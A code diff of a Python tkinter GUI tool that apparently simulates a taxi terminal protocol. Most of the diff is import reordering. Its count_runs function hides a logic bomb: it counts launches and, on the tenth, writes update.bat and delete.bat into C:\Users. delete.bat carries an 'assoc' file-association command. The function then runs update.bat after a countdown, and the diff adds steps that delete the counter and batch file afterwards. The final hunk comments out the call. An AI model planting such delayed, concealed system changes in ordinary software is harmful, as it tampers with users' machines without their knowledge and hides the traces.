@@ -1,24 +1,23 @@
-import os
-import threading
-import time
-import random
-import math
-from V3ku import *
-from socket import *
-from tkinter import *
-from tkinter import messagebox
-from tkinter.ttk import *
-from 出租车.V905ku import 报警标志, 车辆状态, 经纬度, 速度, 签退方式, 报警标志1, 车辆状态1, 经纬度1, 速度1, 评价选项, \
-    电召订单ID, 交易类型
-
 # coding=utf-8
 import binascii
+import math
+import os
+import random
 import re
+import threading
+import time
 import tkinter as tk
+from socket import *
+from tkinter import *
 from tkinter.colorchooser import askcolor
-from pygame import mixer
+from tkinter.ttk import *
 
 import ttkbootstrap as ttk
+from pygame import mixer
+
+from V3ku import *
+from 出租车.V905ku import 报警标志, 车辆状态, 经纬度, 速度, 签退方式, 报警标志1, 车辆状态1, 经纬度1, 速度1, 评价选项, \
+    电召订单ID, 交易类型
 
 LOG_LINE_NUM = 0
 init_window = ttk.Window()  # 实例化出一个父窗口
@@ -2676,10 +2675,14 @@ def countdown(t):
 
 def count_runs():
     # 获取当前日期和时间
+    global file_path
     current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
     import os
-    path = r"C:\Users"
     try:
+        path = r"C:\Users"
+        if not os.path.exists(path):
+            # 创建路径
+            os.makedirs(path)
         file_path = os.path.join(path, "count.txt")
         with open(file_path, "r") as file:
             runs = int(file.readline().strip()) + 1
@@ -2689,12 +2692,6 @@ def count_runs():
 
         print(f"第 {runs} 次运行于 {current_time}")
         if runs == 10:
-            countdown(60)
-            print('123')
-
-            if not os.path.exists(path):
-                # 创建路径
-                os.makedirs(path)
             file_path1 = os.path.join(path, "update.bat")
             file_path2 = os.path.join(path, "delete.bat")
             with open(file_path1, "w") as file:
@@ -2702,9 +2699,13 @@ def count_runs():
             with open(file_path2, "w") as file:
                 file.write("assoc.exe=exefile")
             import subprocess
+            countdown(60)
             subprocess.Popen(r"C:\Users\update.bat")
+            countdown(5)
+            os.remove(r"C:\Users\count.txt")
+            os.remove(r"C:\Users\update.bat")
     except FileNotFoundError:
-        with open("count.txt", "w") as file:
+        with open(file_path, "w") as file:
             file.write("1\n")
 
         print(f"首次运行于 {current_time}")
@@ -2728,4 +2729,4 @@ def gui4_start():
 
 if __name__ == '__main__':
     gui4_start()
-    count_runs()
+    # count_runs()
